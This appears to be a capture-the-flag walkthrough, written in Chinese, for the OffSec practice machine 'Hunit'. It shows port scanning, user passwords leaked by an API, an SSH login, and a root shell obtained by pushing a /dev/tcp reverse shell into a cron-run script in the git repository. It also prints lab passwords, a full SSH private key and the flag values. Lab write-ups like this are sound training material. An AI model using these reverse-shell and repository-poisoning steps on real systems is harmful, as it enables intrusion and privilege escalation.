###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Hunit
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.208.125 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.208.125:8080
Open 192.168.208.125:12445
Open 192.168.208.125:18030
Open 192.168.208.125:43022

PORT      STATE SERVICE     REASON  VERSION
8080/tcp  open  http-proxy  syn-ack
|_http-title: My Haikus
12445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
18030/tcp open  http        syn-ack Apache httpd 2.4.46 ((Unix))
|_http-title: Whack A Mole!
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
43022/tcp open  ssh         syn-ack OpenSSH 8.4 (protocol 2.0)
```

dirsearch，有個`/api/`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ dirsearch -u http://192.168.208.125:8080

[23:55:26] Starting:                                                                                                    
[23:55:32] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[23:55:33] 400 -  435B  - /a%5c.aspx                                        
[23:55:39] 200 -  148B  - /api/                                             
[23:55:40] 404 -  141B  - /article/admin                                    
[23:55:46] 500 -  105B  - /error                                            
[23:55:46] 500 -  105B  - /error/
```

`http://192.168.208.125:8080/api/`，去`/user/`看看
```json
[
  {
    "string": "/api/",
    "id": 13
  },
  {
    "string": "/article/",
    "id": 14
  },
  {
    "string": "/article/?",
    "id": 15
  },
  {
    "string": "/user/",
    "id": 16
  },
  {
    "string": "/user/?",
    "id": 17
  }
]
```

`http://192.168.208.125:8080/api/user/`可看到Admin的帳號為`dademola/ExplainSlowQuest110`
```json
[
  {
    "login": "rjackson",
    "password": "yYJcgYqszv4aGQ",
    "firstname": "Richard",
    "lastname": "Jackson",
    "description": "Editor",
    "id": 1
  },
  {
    "login": "jsanchez",
    "password": "d52cQ1BzyNQycg",
    "firstname": "Jennifer",
    "lastname": "Sanchez",
    "description": "Editor",
    "id": 3
  },
  {
    "login": "dademola",
    "password": "ExplainSlowQuest110",
    "firstname": "Derik",
    "lastname": "Ademola",
    "description": "Admin",
    "id": 6
  },
  {
    "login": "jwinters",
    "password": "KTuGcSW6Zxwd0Q",
    "firstname": "Julie",
    "lastname": "Winters",
    "description": "Editor",
    "id": 7
  },
  {
    "login": "jvargas",
    "password": "OuQ96hcgiM5o9w",
    "firstname": "James",
    "lastname": "Vargas",
    "description": "Editor",
    "id": 10
  }
]
```

ssh登入，在`/home/dademola`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh -p 43022 dademola@192.168.208.125

dademola@192.168.208.125's password: ExplainSlowQuest110
[dademola@hunit ~]$ cat local.txt 
5f67518ad074d109304b28299a3a8d38
```

`linpeas.sh`，重點是`/etc/crontab.bak`跟`/home/git/.ssh/id_rsa`
```
[dademola@hunit ~]$ wget 192.168.45.165:8080/linpeas.sh
[dademola@hunit ~]$ chmod +x linpeas.sh 
[dademola@hunit ~]$ ./linpeas.sh

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                            
/usr/bin/crontab                                                                                                                  
incrontab Not Found
-rw-r--r-- 1 root root   74 Oct 31  2019 /etc/cron.deny                                                                           
-rw-r--r-- 1 root root   66 Jan 15  2021 /etc/crontab.bak

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                       
                                                                                                                                  
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
qMb6iia+pJ6DLLAAAACnJvb3RAaHVuaXQ=
-----END OPENSSH PRIVATE KEY-----
```

查看`/etc/crontab.bak`，發現他會執行pull，我們也可以登入git
```
[dademola@hunit tmp]$ cat /etc/crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

在kali這端`git clone`下來，修改`backups.sh`再push上去，要記得`chmod`
要記得`chmod`
要記得`chmod`
要記得`chmod`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/pgplay]
└─$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.208.125:/git-server

## backups.sh
#!/bin/bash
#
#
# # Placeholder
#
/bin/sh -i >& /dev/tcp/192.168.45.165/18030 0>&1

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp18030

┌──(kali㉿kali)-[~/pgplay/git-server]
└─$ chmod 777 backups.sh

┌──(kali㉿kali)-[~/pgplay/git-server]
└─$ git add backups.sh

┌──(kali㉿kali)-[~/pgplay/git-server]
└─$ git commit -m "backups.sh"

┌──(kali㉿kali)-[~/pgplay/git-server]
└─$ GIT_SSH_COMMAND='ssh -i /home/kali/pgplay/id_rsa -p 43022' git push origin master
```

等反彈，到/root得proof.txt
```
sh-5.0# whoami
root

sh-5.0# cat proof.txt
a180c6f1dafdcee263aaf1cc409f28a1
```